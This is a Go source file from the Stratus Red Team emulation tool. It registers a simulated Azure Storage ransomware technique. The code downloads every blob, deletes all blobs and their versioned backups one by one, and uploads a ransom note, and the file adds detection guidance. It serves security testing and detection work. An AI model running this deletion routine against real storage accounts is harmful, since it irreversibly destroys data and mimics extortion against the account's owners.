package azure

import (
	"context"
	_ "embed"
	"fmt"
	"log"
	"os"

	"github.com/datadog/stratus-red-team/v2/internal/utils"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"

	"github.com/Azure/azure-sdk-for-go/sdk/azcore/to"
	"github.com/Azure/azure-sdk-for-go/sdk/storage/azblob"
	"github.com/Azure/azure-sdk-for-go/sdk/storage/azblob/blob"

	"strings"
)

//go:embed main.tf
var tf []byte

const RansomContainerName = `your-files-deleted`
const RansomNoteFilename = `FILES-DELETED.txt`
const RansomNoteContents = `Your data is backed up in a safe location. To negotiate with us for recovery, get in touch with evil@hackerz.io. In 7 days, if we don't hear from you, that data will either be sold or published, and might no longer be recoverable.'`

func init() {
	const codeBlock = "```"
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "azure.impact.blob-ransomware-individual-file-deletion",
		FriendlyName: "Azure ransomware via Storage Account Blob deletion",
		Description: `
Simulates Azure Storage ransomware activity that empties a storage account through individual Blob deletion, then uploads a ransom note.

Warm-up: 

- Create an Azure Storage Account, with versioning enabled
- Create Storage Containers in the Storage Account, each with a large number blobs with random content and extensions

Detonation: 

- List all available storage containers and their blobs and their versions in the bucket
- Delete all blobs in each container one by one, using [DeleteBlob](https://learn.microsoft.com/en-us/rest/api/storageservices/delete-blob?tabs=microsoft-entra-id)
- List and delete all blobs _again_ to delete any backups created by versioning
- Upload a ransom note to the storage account

Note: The attack does not need to disable versioning, which does not protect against ransomware. This attack removes all versions of the objects in the bucket. 

References:
[Storm-0501’s evolving techniques lead to cloud-based ransomware](https://www.microsoft.com/en-us/security/blog/2025/08/27/storm-0501s-evolving-techniques-lead-to-cloud-based-ransomware/)
(https://www.microsoft.com/en-us/security/blog/2025/10/20/inside-the-attack-chain-threat-activity-targeting-azure-blob-storage/)

`,
		Detection: `
You can detect ransomware activity by identifying abnormal patterns of blobs being downloaded or deleted in a storage account. 
In general, this can be done through [Blob storage events](https://learn.microsoft.com/en-us/azure/storage/blobs/storage-blob-event-overview)

Sample Blob storage event <code>DeleteBlob</code>, shortened for readability:

` + codeBlock + `json hl_lines="3 8 10"
{
  "operationName": "DeleteBlob",
  "category": "StorageDelete",
  "properties": {
    "accountName":"my-storage-account",
    "objectKey": "/my-storage-account/storage-container/somefolder/foo.bar"
  },
  "resourceId":"/subscriptions/ac382a89-52bf-4923-8abd-f1e4791cd48f/resourceGroups/my-resource-group/providers/Microsoft.Storage/storageAccounts/my-storage-account/blobServices/default"
}
` + codeBlock + `
`,
		Platform:                   stratus.Azure,
		IsIdempotent:               false,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Impact},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	storageAccount := params["storage_account_name"]
	//rg := params["resource_group_name"]

	serviceURL := fmt.Sprintf("https://%s.blob.core.windows.net/", storageAccount)

	azureConfig := providers.Azure()
	client, err := utils.GetAzureBlobClient(serviceURL, azureConfig.SubscriptionID, azureConfig.GetCredentials(), azureConfig.ClientOptions /*providers.Azure()*/, params)
	if err != nil {
		return fmt.Errorf("failed to instantiate Blob Client:  %w", err)
	}

	log.Println("Downloading Blobs...")
	err = downloadAllBlobs(client)
	if err != nil {
		return fmt.Errorf("unable to download blobs: %w", err)
	}

	log.Println("Deleting Blobs...")
	err = deleteAllBlobs(client)
	if err != nil {
		return fmt.Errorf("unable to delete blobs: %w", err)
	}

	log.Println("Deleting versioned Blob backups...")
	err = deleteAllBlobsIncludingVersions(client)
	if err != nil {
		return fmt.Errorf("unable to delete blobs: %w", err)
	}

	log.Println("Uploading ransom note...")
	err = utils.UploadBlob(client, RansomContainerName, RansomNoteFilename, strings.NewReader(RansomNoteContents))
	if err != nil {
		return fmt.Errorf("unable to create ransom note: %w", err)
	}

	log.Println("Technique execution completed")
	return nil
}

func downloadAllBlobs(client *azblob.Client) error {
	f, err := os.OpenFile(os.DevNull, os.O_WRONLY, 0)
	if err != nil {
		return err
	}
	defer f.Close()

	blobMap, err := utils.ListAllBlobVersions(client)
	if err != nil {
		return err
	}
	for containerName, versionMap := range blobMap {
		for blobName := range versionMap {
			_, err := client.DownloadFile(context.Background(), containerName, blobName, f, nil)
			if err != nil {
				return fmt.Errorf("error when downloading blob %s in container %s: %w", blobName, containerName, err)
			}
		}
	}
	return nil
}

func deleteAllBlobs(client *azblob.Client) error {
	return deleteBlobsWithFilter(client, false)
}

func deleteAllBlobsIncludingVersions(client *azblob.Client) error {
	return deleteBlobsWithFilter(client, true)
}

func deleteBlobsWithFilter(client *azblob.Client, includeVersions bool) error {

	blobMap, err := utils.ListAllBlobVersions(client)
	if err != nil {
		return err
	}
	numBlobs, numContainers := getNumBlobs(blobMap)
	log.Println("Fetched", numBlobs, "blobs across", numContainers, "containers")
	log.Println("Deleting one by one...")
	for containerName, versionMap := range blobMap {
		containerClient := client.ServiceClient().NewContainerClient(containerName)

		for blobName, versionIDs := range versionMap {
			for _, versionID := range versionIDs {

				blobClient := containerClient.NewBlobClient(blobName)
				if versionID != nil && includeVersions {
					var versionedBlobClient *blob.Client
					versionedBlobClient, err = blobClient.WithVersionID(*versionID)
					if err != nil {
						return fmt.Errorf("can't instantiate versioned client for blob %s in container %s: %w", blobName, containerName, err)
					}
					_, err = versionedBlobClient.Delete(
						context.Background(),
						nil,
				)
				} else {
					_, err = blobClient.Delete(
						context.Background(),
						&blob.DeleteOptions{
							DeleteSnapshots: to.Ptr(blob.DeleteSnapshotsOptionTypeInclude),
						},
					)
				}

				if err != nil {
					return fmt.Errorf("error when deleting blob %s in container %s: %w", blobName, containerName, err)
				}
			}
		}
	}
	return nil
}

func getNumBlobs(blobMap map[string]map[string][]*string) (int, int) {
	if blobMap == nil {
		return 0, 0
	}
	total := 0
	for _, inner := range blobMap {
		if inner == nil {
			continue
		}
		total += len(inner)
	}
	return total, len(blobMap)
}